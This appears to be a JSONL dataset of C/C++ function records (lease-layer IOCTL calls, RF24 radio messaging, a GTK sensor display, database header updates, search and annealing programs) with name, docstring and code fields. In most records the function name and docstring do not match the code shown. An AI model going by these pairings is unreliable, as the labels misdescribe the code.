{"content":"{'function_name': 'SetListenerSecurityDescriptor', 'docstring': '\/*\\n    BOOL ret = FALSE;\\n    if (!IsLeaseLayerInitialized())\\n    {\\n        return ret;\\n    }\\n\\n    if (NULL == LeaseAgentHandle || \\n        INVALID_HANDLE_VALUE == LeaseAgentHandle || \\n        IsValidSecurityDescriptor(selfRelativeSecurityDescriptor) == FALSE) \/\/ lease driver code will verify if the input is in self-relative format\\n    {\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n        return ret;\\n    }\\n\\n    ULONG securityDescriptorSize = GetSecurityDescriptorLength(selfRelativeSecurityDescriptor);\\n    ASSERT_IF(securityDescriptorSize < sizeof(SECURITY_DESCRIPTOR), \"Invalid security descriptor size\");\\n\\n    ULONG sdStartOffset = (ULONG)(&(((PSET_SECURITY_DESCRIPTOR_INPUT_BUFFER)nullptr)->SecurityDescriptor));\\n    DWORD inputBufferSize = sdStartOffset + securityDescriptorSize;\\n\\n    PBYTE inputBuffer = new BYTE[inputBufferSize];\\n    if (NULL == inputBuffer)\\n    {\\n        SetLastError(ERROR_NO_SYSTEM_RESOURCES);\\n        return ret;\\n    }\\n\\n    KFinally([inputBuffer] { delete inputBuffer; });\\n\\n    PSET_SECURITY_DESCRIPTOR_INPUT_BUFFER DeviceIoctlSetSecurityDescriptorInputBufferPtr = \\n        reinterpret_cast<PSET_SECURITY_DESCRIPTOR_INPUT_BUFFER>( inputBuffer );\\n\\n    DeviceIoctlSetSecurityDescriptorInputBufferPtr->LeaseAgentHandle = LeaseAgentHandle;\\n    DeviceIoctlSetSecurityDescriptorInputBufferPtr->SecurityDescriptorSize = securityDescriptorSize;\\n    if (memcpy_s(\\n        &(DeviceIoctlSetSecurityDescriptorInputBufferPtr->SecurityDescriptor),\\n        securityDescriptorSize,\\n        selfRelativeSecurityDescriptor,\\n        securityDescriptorSize))\\n    {\\n        return ret;\\n    }\\n\\n    DWORD BytesReturned = 0;\\n\\n    return DeviceIoControl(\\n        IOCTL_SET_SECURITY_DESCRIPTOR,\\n        DeviceIoctlSetSecurityDescriptorInputBufferPtr,\\n        inputBufferSize,\\n        NULL, \\n        0,\\n        &BytesReturned,\\n        NULL\\n        ); *\/', 'code': \"BOOL WINAPI \\nBlockLeaseConnection(\\n    __in PTRANSPORT_LISTEN_ENDPOINT LocalSocketAddress,\\n    __in PTRANSPORT_LISTEN_ENDPOINT RemoteSocketAddress,\\n    __in BOOL IsBlocking\\n    )\\n\/*++\\n \\nRoutine Description:\\n \\n    Blocking the connectiosn between two lease agents by dropping all messages\\n    Unblocking by set the flag 'IsBlocking' to false\\n\\nParameters Description:\\n \\n    SocketAddress - socket addresss of involved lease agents.\\n \\nReturn Value:\\n \\n    TRUE if inputs are valid, FALSE otherwise. \\n    Call GetLastError to retrieve the actual error that occured.\\n \\n--*\/\\n\\n{\\n    DWORD BytesReturned = 0;\\n\\n    BLOCK_LEASE_CONNECTION_BUFFER_DEVICE_IOCTL DeviceIoctlInputBuffer;\\n    ZeroMemory(&DeviceIoctlInputBuffer, sizeof(BLOCK_LEASE_CONNECTION_BUFFER_DEVICE_IOCTL));\\n\\n    \/\/\\n    \/\/ Check to see if the user mode lease layer has been successfully initialized.\\n    \/\/\\n    if (!IsLeaseLayerInitialized())\\n    {\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Check input arguments.\\n    \/\/\\n    if (NULL == LocalSocketAddress || NULL == RemoteSocketAddress)\\n    {\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Initialize device IOCTL input buffer.\\n    \/\/\\n    if (memcpy_s(\\n        &DeviceIoctlInputBuffer.LocalSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT),\\n        LocalSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT)\\n        ))\\n    {\\n        return FALSE;\\n    }\\n\\n    if (memcpy_s(\\n        &DeviceIoctlInputBuffer.RemoteSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT),\\n        RemoteSocketAddress,\\n        sizeof(TRANSPORT_LISTEN_ENDPOINT)\\n        ))\\n    {\\n        return FALSE;\\n    }\\n\\n    DeviceIoctlInputBuffer.IsBlocking = BOOLEAN(IsBlocking);\\n    \/\/\\n    \/\/ Create a device IOCTL and send it to the device.\\n    \/\/\\n\\n    LeaseLayerEvents.BlockLeaseConnection(\\n        LocalSocketAddress->Address,\\n        LocalSocketAddress->Port,\\n        RemoteSocketAddress->Address,\\n        RemoteSocketAddress->Port,\\n        BOOLEAN(IsBlocking)\\n        );\\n\\n    return NT_SUCCESS(DeviceIoControl(\\n        IOCTL_BLOCK_LEASE_CONNECTION,\\n        &DeviceIoctlInputBuffer,\\n        sizeof(BLOCK_LEASE_CONNECTION_BUFFER_DEVICE_IOCTL),\\n        NULL,\\n        0,\\n        &BytesReturned))? TRUE : FALSE;\\n\\n\\n}\"}","id":1165}
{"content":"{'function_name': 'loop', 'docstring': '\/\/  }', 'code': 'bool send_T(uint16_t to)\\n{\\n  RF24NetworkHeader header(\/*to node*\/ to, \/*type*\/ \\'T\\' \/*Time*\/);\\n  \\n  \/\/ The \\'T\\' message that we send is just a ulong, containing the time\\n  unsigned long message = millis();\\n  printf_P(PSTR(\"---------------------------------\\\\n\\\\r\"));\\n  printf_P(PSTR(\"%lu: APP Sending %lu to 0%o...\\\\n\\\\r\"),millis(),message,to);\\n  return network.write(header,&message,sizeof(unsigned long));\\n}'}","id":1166}
{"content":"{'function_name': 'img2buf', 'docstring': '\/\/ now copy the image to the pixbuf', 'code': 'gboolean refreshData (void*)\\n{\\n\\n    static char _displayed[1000];\\n\\n    \/\/ update textView using numerical data\\n    _dataSem.wait();\\n    sprintf(_displayed, \"\\\\\\nTr0 %3.2f %3.2f %3.2f %3.2f %3.2f %3.2f\\\\n\\\\\\nTr1 %3.2f %3.2f %3.2f %3.2f %3.2f %3.2f\\\\n\\\\\\nGaze %1d %3.2f %3.2f\\\\n\\\\\\nGlove\\\\n\\\\\\n%3d %3d %3d  %3d %3d %3d\\\\n\\\\\\n%3d %3d %3d  %3d %3d %3d\\\\n\\\\\\n%3d %3d %3d\\\\n\\\\\\n%3d %3d %3d %3d - %3d %3d %3d\\\\n\\\\\\nPress %5d %5d %5d %5d\",\\n\\t\\t\\t_data.tracker0Data.x, _data.tracker0Data.y, _data.tracker0Data.z, _data.tracker0Data.azimuth,_data.tracker0Data.elevation, _data.tracker0Data.roll,\\n\\t\\t\\t_data.tracker1Data.x, _data.tracker1Data.y, _data.tracker1Data.z, _data.tracker1Data.azimuth,_data.tracker1Data.elevation, _data.tracker1Data.roll,\\n\\t\\t\\t_data.GTData.valid, _data.GTData.pupilX, _data.GTData.pupilY,\\n\\t\\t\\t_data.gloveData.thumb[0], _data.gloveData.thumb[1], _data.gloveData.thumb[2],\\n\\t\\t\\t_data.gloveData.index[0], _data.gloveData.index[1], _data.gloveData.index[2],\\n\\t\\t\\t_data.gloveData.middle[0], _data.gloveData.middle[1], _data.gloveData.middle[2],\\n\\t\\t\\t_data.gloveData.ring[0], _data.gloveData.ring[1], _data.gloveData.ring[2],\\n\\t\\t\\t_data.gloveData.pinkie[0], _data.gloveData.pinkie[1], _data.gloveData.pinkie[2],\\n\\t\\t\\t_data.gloveData.abduction[0], _data.gloveData.abduction[1], _data.gloveData.abduction[2], _data.gloveData.abduction[3],\\n\\t\\t\\t_data.gloveData.palmArch, _data.gloveData.wristPitch, _data.gloveData.wristYaw,\\n\\t\\t    _data.pressureData.channelA, _data.pressureData.channelB, _data.pressureData.channelC, _data.pressureData.channelD\\n\\t\\t\\t);\\n    _dataSem.post();\\n    GtkTextBuffer* buf = gtk_text_view_get_buffer((GtkTextView*)numDataTextView);\\n    gtk_text_buffer_set_text(buf, _displayed, -1);\\n    gtk_widget_queue_draw(numDataTextView);\\n\\n    \/\/ update camera windows\\n    _img0Sem.wait();\\n    img2buf(&_img0,camera0Buf);\\n    _img0Sem.post();\\n    gtk_widget_queue_draw (camera0Image);\\n    _img1Sem.wait();\\n    img2buf(&_img1,camera1Buf);\\n    _img1Sem.post();\\n    gtk_widget_queue_draw (camera1Image);\\n\\n    \/\/ update status bar\\n    sprintf(statusBarMsg, \"data %3.2f, cam0 %3.2f, cam1 %3.2f\", _dataFreq, _img0Freq, _img1Freq);\\n    gtk_statusbar_push ((GtkStatusbar*)statusBar,\\n                        gtk_statusbar_get_context_id((GtkStatusbar*)statusBar,\"msg\"),\\n                        statusBarMsg);\\n    gtk_widget_queue_draw (statusBar);\\n\\n    return (collector_awake?TRUE:FALSE);\\n\\n}'}","id":1173}
{"content":"{'function_name': 'ErrDBTryToZeroDBTrailer', 'docstring': '\/\/  for this one time JetInit after backup restore.', 'code': 'LOCAL ERR ErrDBIUpdateHeaderFromTrailer(\\n    const INST * const pinst,\\n    IFileSystemAPI * const pfsapi,\\n    DBFILEHDR   * const pdbfilehdr,\\n    const PATCHHDR * const ppatchhdr,\\n    const WCHAR * const wszDatabase,\\n    BOOL fSkipMinLogChecks )\\n\/\/  ================================================================\\n\/\/\\n\/\/ Updates the database header in pdbfilehdr with information from the\\n\/\/ trailer in ppatchhdr and writes the header to wszDatabase.\\n\/\/\\n\/\/-\\n{\\n    Assert( pfsapi );\\n    Assert( pdbfilehdr );\\n    Assert( ppatchhdr );\\n    Assert( wszDatabase );\\n\\n    ERR             err         = JET_errSuccess;\\n\\n    CallR( ErrDBCheckDBHeaderAndTrailer( pdbfilehdr, ppatchhdr, wszDatabase, fSkipMinLogChecks ) );\\n\\n    Assert( FDBHeaderNeedsUpdating( pdbfilehdr ) || fSkipMinLogChecks );\\n\\n    \/\/ All of these values are supposed to be unsigned, but they are sometimes treated\\n    \/\/ as signed or cast to signed variables in other parts of the code, which may lead\\n    \/\/ to problems if they are > lMax, i.e., if they turn out to be negative due to bugs.\\n    \/\/ This has happened in the past so the asserts below aim to catch such bugs as closely\\n    \/\/ as possible to their source.\\n    const LONG lgenLow = ppatchhdr->bkinfo.le_genLow;\\n    const LONG lgenHigh = ppatchhdr->bkinfo.le_genHigh;\\n    const LONG lgenMinReq = ppatchhdr->lgenMinReq;\\n    const LONG lgenMaxReq = ppatchhdr->lgenMaxReq;\\n    const LONG lgenMaxCommited = ppatchhdr->lgenMaxCommitted;\\n\\n    Assert( lgenLow > 0 );\\n    Assert( lgenHigh > 0 );\\n    Assert( lgenMinReq >= 0 );\\n    Assert( lgenMaxReq >= 0 );\\n    Assert( lgenMaxCommited >= 0 );\\n\\n    pdbfilehdr->bkinfoFullCur.le_genHigh = lgenHigh;\\n\\n    if ( !fSkipMinLogChecks )\\n    {\\n        Assert( pdbfilehdr->le_lGenMinRequired == 0 || pdbfilehdr->le_lGenMinRequired >= lgenLow );\\n    }\\n    else\\n    {\\n        \/\/ HA restartable reseed passes this. We could have also detached\/re-attached in the middle of\\n        \/\/ backup\/reseed, so mark header as \"dirty and patched\" so we do not mark database as clean on\\n        \/\/ seeing a Detach\/Term record until we are past the MaxRequired generation.\\n        \/\/ Restricting it to HA restartable reseed only because without aggressive log rollover, it may\\n        \/\/ take too long to get back to dirty state.\\n\\n        \/\/ Copy relevant asserts from SetDbState. We cannot use SetDbState because it does not transition\\n        \/\/ from JET_dbstateIncrementalReseedInProgress and we do not have logtime of maxCommitted log, so\\n        \/\/ better to copy relevant asserts here rather than pollute the SetDbState state transition machine.\\n        Assert( 0 != lgenLow && lGenerationInvalid != lgenLow );\\n        Assert( 0 != lgenHigh && lGenerationInvalid != lgenHigh );\\n        Assert( ( pdbfilehdr->le_dbstate == JET_dbstateDirtyShutdown ) || ( pdbfilehdr->le_dbstate == JET_dbstateDirtyAndPatchedShutdown ) );\\n\\n        pdbfilehdr->le_dbstate = JET_dbstateDirtyAndPatchedShutdown;\\n    }\\n\\n    Expected( ( ( lgenMinReq == 0 ) && ( lgenMaxReq == 0 ) && ( lgenMaxCommited == 0 ) ) ||\\n              ( ( lgenMinReq > 0 ) && ( lgenMaxReq > 0 ) && ( lgenMaxCommited > 0 ) ) );\\n    Expected( !!ppatchhdr->logtimeGenMaxRequired.FIsSet() == !!ppatchhdr->logtimeGenMaxCommitted.FIsSet() );\\n    Assert( ( lgenMinReq == 0 ) || ( lgenMinReq >= lgenLow ) );\\n    Assert( ( lgenMaxReq == 0 ) || ( lgenMaxReq <= lgenHigh ) );\\n    Assert( ( lgenMaxCommited == 0 ) || ( lgenMaxCommited <= lgenHigh ) );\\n    Assert( pdbfilehdr->le_lGenMaxRequired <= lgenHigh );\\n    Assert( pdbfilehdr->le_lGenMaxCommitted <= lgenHigh );\\n\\n    const LONG lgenMinReqPatch = lgenMinReq;\\n    const LONG lgenMaxReqPatch = ( lgenMaxReq > 0 ) ? lgenMaxReq : lgenHigh;\\n    const LONG lgenMaxComPatch = ( lgenMaxCommited > 0 ) ? lgenMaxCommited : lgenHigh;\\n\\n    \/\/ The required range at the beginning of the backup may not be the same as at the end.\\n    if ( ( lgenMinReqPatch > 0 ) &&\\n         ( lgenMinReqPatch < pdbfilehdr->le_lGenMinRequired ) )\\n    {\\n        \/\/ We don\\'t expect this code to hit for now. This can only happen if the backup was interrupted\\n        \/\/ and then restarted following a checkpoint deletion or incremental reseed, which only Exchange\\'s\\n        \/\/ HA does. However, they also use JET_bitReplayIgnoreLogRecordsBeforeMinRequiredLog, which suppresses\\n        \/\/ replaying log files below the DB\\'s min required. They also abort a full seed if the min required\\n        \/\/ goes backwards due to incremental reseed.\\n        FireWall( \"BackupUpdHdrFromTrailerLoweredMinReq\" );\\n        Assert( lgenMinReqPatch >= lgenLow );\\n        pdbfilehdr->le_lGenMinRequired = lgenMinReqPatch;\\n    }\\n    if ( lgenMaxReqPatch >= pdbfilehdr->le_lGenMaxRequired )\\n    {\\n        pdbfilehdr->logtimeGenMaxRequired = ppatchhdr->logtimeGenMaxRequired;\\n        pdbfilehdr->le_lGenMaxRequired = lgenMaxReqPatch;\\n    }\\n    if ( lgenMaxComPatch >= pdbfilehdr->le_lGenMaxCommitted )\\n    {\\n        pdbfilehdr->logtimeGenMaxCreate = ppatchhdr->logtimeGenMaxCommitted;\\n        pdbfilehdr->le_lGenMaxCommitted = lgenMaxComPatch;\\n    }\\n\\n    \/\/ Reset these fields.\\n    pdbfilehdr->le_lGenMinConsistent = pdbfilehdr->le_lGenMinRequired;\\n    pdbfilehdr->le_lGenPreRedoMinConsistent = 0;\\n    pdbfilehdr->le_lGenPreRedoMinRequired = 0;\\n\\n    Assert( !FDBHeaderNeedsUpdating( pdbfilehdr ) );\\n\\n    CallR( ErrUtilWriteUnattachedDatabaseHeaders( pinst, pfsapi, wszDatabase, pdbfilehdr ) );\\n\\n    CallS( err );\\n\\n    return err;\\n}'}","id":1175}
{"content":"{'function_name': 'condExp', 'docstring': '\/\/ Not reachable', 'code': 'void whereStmt( Seq<Instr>* seq\\n              , Stmt* s\\n              , Var condVar\\n              , AssignCond cond\\n              , bool saveRestore )\\n{\\n  if (s == NULL) return;\\n\\n  \/\/ ----------\\n  \/\/ Case: skip\\n  \/\/ ----------\\n  if (s->tag == SKIP) return;\\n\\n  \/\/ ------------------------------------------------------\\n  \/\/ Case: v = e, where v is a variable and e an expression\\n  \/\/ ------------------------------------------------------\\n  if (s->tag == ASSIGN && s->assign.lhs->tag == VAR) {\\n    varAssign(seq, cond, s->assign.lhs->var, s->assign.rhs);\\n    return;\\n  }\\n\\n  \/\/ ---------------------------------------------\\n  \/\/ Case: s0 ; s1, where s0 and s1 are statements\\n  \/\/ ---------------------------------------------\\n  if (s->tag == SEQ) {\\n    whereStmt(seq, s->seq.s0, condVar, cond, true);\\n    whereStmt(seq, s->seq.s1, condVar, cond, saveRestore);\\n    return;\\n  }\\n\\n  \/\/ ----------------------------------------------------------\\n  \/\/ Case: where (b) s0 s1, where b is a boolean expression and\\n  \/\/                        s0 and s1 are statements.\\n  \/\/ ----------------------------------------------------------\\n  if (s->tag == WHERE) {\\n    if (cond.tag == ALWAYS) {\\n      \/\/ This case has a cheaper implementation\\n\\n      \/\/ Compile new boolean expression\\n      AssignCond newCond = boolExp(seq, s->where.cond, condVar, true);\\n\\n      \/\/ Compile \\'then\\' statement\\n      if (s->where.thenStmt != NULL)\\n        whereStmt(seq, s->where.thenStmt, condVar, newCond,\\n          s->where.elseStmt != NULL);\\n\\n      \/\/ Compile \\'else\\' statement\\n      if (s->where.elseStmt != NULL)\\n        whereStmt(seq, s->where.elseStmt, condVar,\\n                    negAssignCond(newCond), false);\\n    }\\n    else {\\n      \/\/ Save condVar\\n      Var savedCondVar = freshVar();\\n      if (saveRestore || s->where.elseStmt != NULL)\\n        seq->append(move(savedCondVar, condVar, false));\\n\\n      \/\/ Compile new boolean expression\\n      Var newCondVar = freshVar();\\n      AssignCond newCond = boolExp(seq, s->where.cond, newCondVar, true);\\n\\n      if (s->where.thenStmt != NULL) {\\n        \/\/ AND new boolean expression with original condition\\n        AssignCond andCond = boolAnd(seq, cond, condVar, newCond, true);\\n\\n        \/\/ Compile \\'then\\' statement\\n        whereStmt(seq, s->where.thenStmt, condVar, andCond, false);\\n      }\\n\\n      if (saveRestore || s->where.elseStmt != NULL)\\n        seq->append(move(condVar, savedCondVar, true));\\n\\n      if (s->where.elseStmt != NULL) {\\n        \/\/ AND negation of new boolean expression with original condition\\n        AssignCond andCond = boolAnd(seq, negAssignCond(newCond), newCondVar,\\n                               cond, true);\\n  \\n        \/\/ Compile \\'else\\' statement\\n        whereStmt(seq, s->where.elseStmt, newCondVar, andCond, false);\\n  \\n        \/\/ Restore condVar and implicit condition vector\\n        if (saveRestore)\\n          seq->append(move(condVar, savedCondVar, true));\\n      }\\n    }\\n\\n    return;\\n  }\\n\\n  printf(\"QPULib: only assignments and nested \\'where\\' \\\\\\n          statements can occur in a \\'where\\' statement\\\\n\");\\n  assert(false);\\n}'}","id":1177}
{"content":"{'function_name': 'BestPath', 'docstring': '\/*Function per la scrittura finale del miglior percorso*\/', 'code': 'int main(){\\n\\n\/* Seed per il generatore *\/\\n  int seed[4];\\n  int p1, p2;\\n  ifstream Primes(\"Primes\");\\n  Primes >> p1 >> p2 ;\\n  Primes.close();\\n\\n  ifstream input(\"seed.in\");\\n  input >> seed[0] >> seed[1] >> seed[2] >> seed[3];\\n  rnd.SetRandom(seed,p1,p2);\\n  input.close();\\n  rnd.SaveSeed();\\n\/*---------------*\/\\n  \\n  Input();\\n\\n  cout << \"-------------Simulated Annealing-------------\" << endl;\\n  for(int itemp=0; itemp <= temp_step; itemp++) {\\t\\t\/\/Ciclo sulla temperatura fittizia \\n    temp = temp_i- (temp_i-temp_f)\/temp_step * itemp ;\\n\\n    beta=1\/temp;\\n    cout << \"Step numero \" << itemp+1 << \" Temperatura: \" << temp << endl;\\n    Move(itemp);\\n    cout << \"------------------------------\" << endl;\\n  }\\n  BestPath(); \\n\\n  return 0;\\n\\n}'}","id":1180}
{"content":"{'function_name': 'getValue_virtual_memory', 'docstring': '\/\/ Note: this value is in KB', 'code': 'int getValue_physical_memory()\\n{   \\n    \/\/ Note: this value is in KB\\n    FILE* file = fopen(\"\/proc\/self\/status\", \"r\");\\n    int result = -1;\\n    char line[128];\\n    while(fgets(line, 128, file) != NULL)\\n    {\\n        if(strncmp(line, \"VmRSS:\", 6) == 0){\\n            result = parseLine(line);\\n            break;\\n        }\\n    }\\n    fclose(file);\\n    return result;\\n}'}","id":1190}
{"content":"{'function_name': 'mouse_mode_exec', 'docstring': '\/\/ depressed', 'code': 'int key_code_from_str(string c) {\\n    if (c == \"a\") { return 0; }\\n    if (c == \"s\") { return 1; }\\n    if (c == \"d\") { return 2; }\\n    if (c == \"f\") { return 3; }\\n    if (c == \"h\") { return 4; }\\n    if (c == \"g\") { return 5; }\\n    if (c == \"z\") { return 6; }\\n    if (c == \"x\") { return 7; }\\n    if (c == \"c\") { return 8; }\\n    if (c == \"v\") { return 9; }\\n    \/\/ what is 10?\\n    if (c == \"b\") { return 11; }\\n    if (c == \"q\") { return 12; }\\n    if (c == \"w\") { return 13; }\\n    if (c == \"e\") { return 14; }\\n    if (c == \"r\") { return 15; }\\n    if (c == \"y\") { return 16; }\\n    if (c == \"t\") { return 17; }\\n    if (c == \"1\") { return 18; }\\n    if (c == \"2\") { return 19; }\\n    if (c == \"3\") { return 20; }\\n    if (c == \"4\") { return 21; }\\n    if (c == \"6\") { return 22; }\\n    if (c == \"5\") { return 23; }\\n    if (c == \"=\") { return 24; }\\n    if (c == \"9\") { return 25; }\\n    if (c == \"7\") { return 26; }\\n    if (c == \"-\") { return 27; }\\n    if (c == \"8\") { return 28; }\\n    if (c == \"0\") { return 29; }\\n\\n    if (c == \"!\") { return 18; }\\n    if (c == \"@\") { return 19; }\\n    if (c == \"#\") { return 20; }\\n    if (c == \"$\") { return 21; }\\n    if (c == \"^\") { return 22; }\\n    if (c == \"%\") { return 23; }\\n    if (c == \"(\") { return 25; }\\n    if (c == \"&\") { return 26; }\\n    if (c == \"*\") { return 28; }\\n    if (c == \")\") { return 29; }\\n    if (c == \"\\\\\"\") { return 39; }\\n\\n    if (c == \"\") { return 30; }\\n    if (c == \"o\") { return 31; }\\n    if (c == \"u\") { return 32; }\\n    if (c == \"[\") { return 33; }\\n    if (c == \"i\") { return 34; }\\n    if (c == \"p\") { return 35; }\\n    if (c == \"RETURN\") { return 36; }\\n    if (c == \"l\") { return 37; }\\n    if (c == \"j\") { return 38; }\\n    if (c == \"\\'\") { return 39; }\\n    if (c == \"k\") { return 40; }\\n    if (c == \";\") { return 41; }\\n    if (c == \":\") { return 41; }\\n    if (c == \"\\\\\\\\\") { return 42; }\\n    if (c == \",\") { return 43; }\\n    if (c == \"<\") { return 43; }\\n    if (c == \"\/\") { return 44; }\\n    if (c == \"?\") { return 44; }\\n    if (c == \"n\") { return 45; }\\n    if (c == \"m\") { return 46; }\\n    if (c == \".\") { return 47; }\\n    if (c == \">\") { return 47; }\\n    if (c == \"TAB\") { return 48; }\\n    if (c == \"tab\") { return 48; }\\n    if (c == \"SPACE\") { return 49; }\\n    if (c == \"`\") { return 50; }\\n    if (c == \"DELETE\") { return 51; }\\n    if (c == \"ENTER\") { return 52; }\\n    \/\/if (c == \"ESCAPE\") { return 53; }\\n\\n    \/\/ some more missing codes abound, reserved I presume, but it would\\n    \/\/ have been helpful for Apple to have a document with them all listed\\n\\n    if (c == \"*\") { return 67; }\\n    if (c == \"+\") { return 69; }\\n    if (c == \"CLEAR\") { return 71; }\\n    \/\/if (c == \"\/\") { return 75; }\\n    \/\/if (c == \"ENTER\") { return 76;  \/\/ numberpad on full kbd }\\n    if (c == \"=\") { return 78; }\\n    if (c == \"0\") { return 82; }\\n    if (c == \"1\") { return 83; }\\n    if (c == \"2\") { return 84; }\\n    if (c == \"3\") { return 85; }\\n    if (c == \"4\") { return 86; }\\n    if (c == \"5\") { return 87; }\\n    if (c == \"6\") { return 88; }\\n    if (c == \"7\") { return 89; }\\n    if (c == \"8\") { return 91; }\\n    if (c == \"9\") { return 92; }\\n    if (c == \"F5\") { return 96; }\\n    if (c == \"F6\") { return 97; }\\n    if (c == \"F7\") { return 98; }\\n    if (c == \"F3\") { return 99; }\\n    if (c == \"F8\") { return 100; }\\n    if (c == \"F9\") { return 101; }\\n    if (c == \"F11\") { return 103; }\\n    if (c == \"F13\") { return 105; }\\n    if (c == \"F14\") { return 107; }\\n    if (c == \"F10\") { return 109; }\\n    if (c == \"F12\") { return 111; }\\n    if (c == \"F15\") { return 113; }\\n    \/\/if (c == \"HELP\") { return 114; }\\n    \/\/if (c == \"HOME\") { return 115; }\\n    \/\/if (c == \"PGUP\") { return 116; }\\n    \/\/if (c == \"DELETE\") { return 117; }\\n    \/\/if (c == \"F4\") { return 118; }\\n    \/\/if (c == \"END\") { return 119; }\\n    if (c == \"F2\") { return 120; }\\n    \/\/if (c == \"PGDN\") { return 121; }\\n    \/\/if (c == \"F1\") { return 122; }\\n    if (c == \"LEFT\") { return 123; }\\n    if (c == \"RIGHT\") { return 124; }\\n    if (c == \"DOWN\") { return 125; }\\n    if (c == \"UP\") { return 126; }\\n\\n    return 0;\\n}'}","id":1200}
{"content":"{'function_name': 'printSteps', 'docstring': '\/\/ Print result according to pow function', 'code': 'int main() {\\n    \/\/ Start benchmark\\n    auto start = std::chrono::system_clock::now();\\n\\n    \/\/ 2^1000 = 2*2*2*2*2*2*......*2\\n    \/\/ Of binary operator (1000* bitwise left <<)\\n    \/\/ Initialize variables\\n    int base = 2,\\n            exponent = 1000,\\n            exponentDivider = 1;\\n    deque<long> numbers = {1};\\n\\n    \/\/ Check for result smallest exponent with no remainder\\n    while ((long) pow(base, exponent \/ exponentDivider) < 0 || exponent % exponentDivider != 0) {\\n        exponentDivider += 1;\\n    }\\n\\n    \/\/ Print steps of multiplication\\n    printSteps(base, exponent, exponentDivider);\\n\\n    \/\/ Calculate the power\\n    long factor;\\n    for (int i = 0; i < exponentDivider; ++i) {\\n        factor = multiplySmall(base, exponent \/ exponentDivider);\\n        multiplyLarge(numbers, factor);\\n    }\\n\\n    \/\/ Print own solution\\n    printf(\"\\\\nOwn product of %d^%d\\\\n = \", base, exponent);\\n    for (auto &num: numbers)\\n        cout << num;\\n    cout << endl << endl;\\n\\n    \/\/ Calculate sum of numbers\\n    long sum = accumulate(numbers.begin(), numbers.end(), 0, [](long i, long j) {\\n        return i + j;\\n    });\\n\\n    \/\/ Print solution\\n    printf(\"Solution problem 16: %ld\\\\n\", sum);\\n\\n    \/\/ Print benchmark\\n    auto end = std::chrono::system_clock::now();\\n    std::chrono::duration<double> elapsed_seconds = end - start;\\n    \/\/std::time_t end_time = std::chrono::system_clock::to_time_t(end);\\n\\n    std::cout << \"elapsed time: \" << elapsed_seconds.count() << \"s\\\\n\";\\n}'}","id":1202}
{"content":"{'function_name': 'setup_Funk', 'docstring': '\/\/count How many retries before giving up, max 15', 'code': 'boolean FunkData_Temp_PWM()\\n{\\n  \/\/ Send data:\\n  RF24NetworkHeader header(FunkMasterSwitchcabinet);   \/\/ Address where the data is going\\n  dataOutgoing.header = 1;\\n  \/\/dataOutgoing.val1 = NewTargetTemp_Zone1;\\n  \/\/dataOutgoing.val2 = NewTargetTemp_Zone2;\\n  dataOutgoing.val3 = PwmValuePartCoolingFanMarlin;\\n  boolean ok = network.write(header, &dataOutgoing, sizeof(dataOutgoing)); \/\/ Send the data\\n  \/\/Serial.println(\"Funk DATA Temp!\");\\n  if (ok == true)\\n  {\\n    Serial.println(\"FunkData_Temp_PWM\");\\n    return true;\\n  }\\n  else\\n  {\\n    return false;\\n  }\\n}'}","id":1210}
{"content":"{'function_name': 'printsolution', 'docstring': '\/\/ int path_length = 0;', 'code': 'int main()\\n{\\n\\n\\tnode *start = new node();\\n\\t\/\/cout << \"Hello 1\" << endl;\\n\\t\/\/cout << start->path_cost << endl;\\n\\t\/\/ for (int i = 0; i < 7; i++)\\n\\t\/\/ {\\n\\t\/\/ \\tfor (int j = 0; j < 7; j++)\\n\\t\/\/ \\t{\\n\\t\/\/ \\t\\tcout << board[i][j] << \" \";\\n\\t\/\/ \\t}\\n\\t\/\/ \\tcout << endl;\\n\\t\/\/ }\\n    \/\/cout<<\"size is\"<<start->state.size();\\n    \/\/ for (int i = 0; i < 7; i++)\\n\\t\/\/ {\\n\\t\/\/ \\tfor (int j = 0; j < 7; j++)\\n\\t\/\/ \\t{\\n\\t\/\/ \\t\\tcout << start->state[i][j] << \" \";\\n\\t\/\/ \\t}\\n\\t\/\/ \\tcout << endl;\\n\\t\/\/ }\\n\\n\\tstart->successor();\\n\\t\/\/cout << \"Hello 2\";\\n\\n\\t\\n\\tint ct = 0;\\n\\tpriority_queue<pd, vector<pd>, myComp> frontier;\\n\\tset<node *> explored;\\n\\tfrontier.push(make_pair(start, 0));\\n\\twhile (!frontier.empty())\\n\\t{\\n\\t\\tnode *n = frontier.top().first;\\n\\t\\tif (isGoal(n->state))\\n\\t\\t{\\n\\t\\t\\t\/\/ cout << \"NO of nodes explored are \" << ct;\\n\\t\\t\\t\/\/ printsolution(n);\\n\\t\\t\\t\/\/ return 0;\\n\\t\\t\\tcout << \"NO of nodes explored are \" << ct << endl;\\n            cout << \"Goal state is:\" << endl;\\n            showboard(goal);\\n            cout << \"start state is:\" << endl;\\n            showboard(start->state);\\n            printsolution(n);\\n            return 0;\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{   \\n\\n            showboard(n->state);\\n\\t\\t\\texplored.insert(n);\\n\\n\\t\\t\\tvisited[n->state] = true;\\n\\t\\t\\tct++;\\n\\t\\t\\tn->successor();\\n\\t\\t\\tvector<node *>::iterator itr;\\n\\n\\t\\t\\tfor (itr = n->child.begin(); itr != n->child.end(); itr++)\\n\\t\\t\\t{\\n\\n\\t\\t\\t\\tvector<vector<int>> temp = (*itr)->state;\\n\\t\\t\\t\\tif (!visit(temp))\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tfrontier.push(make_pair(*itr, (*itr)->path_cost));\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tfrontier.pop();\\n\\t}\\n}'}","id":1217}
